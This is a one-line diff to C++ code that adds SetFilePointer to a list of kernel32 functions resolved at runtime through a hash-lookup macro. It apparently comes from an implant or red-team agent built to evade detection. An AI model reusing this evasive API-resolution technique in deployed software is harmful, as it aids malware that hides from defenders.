@@ -259,6 +259,7 @@ namespace Memory {
                 !(F_PTR_HMOD(Ctx->win32.FindFirstFileA, Ctx->modules.kernel32, FINDFIRSTFILEA)) ||
                 !(F_PTR_HMOD(Ctx->win32.FindNextFileA, Ctx->modules.kernel32, FINDNEXTFILEA)) ||
                 !(F_PTR_HMOD(Ctx->win32.FindClose, Ctx->modules.kernel32, FINDCLOSE)) ||
+                !(F_PTR_HMOD(Ctx->win32.SetFilePointer, Ctx->modules.kernel32, SETFILEPOINTER)) ||
 
                 !(F_PTR_HMOD(Ctx->win32.CreateNamedPipeW, Ctx->modules.kernel32, CREATENAMEDPIPEW)) ||
                 !(F_PTR_HMOD(Ctx->win32.CallNamedPipeW, Ctx->modules.kernel32, CALLNAMEDPIPEW)) ||
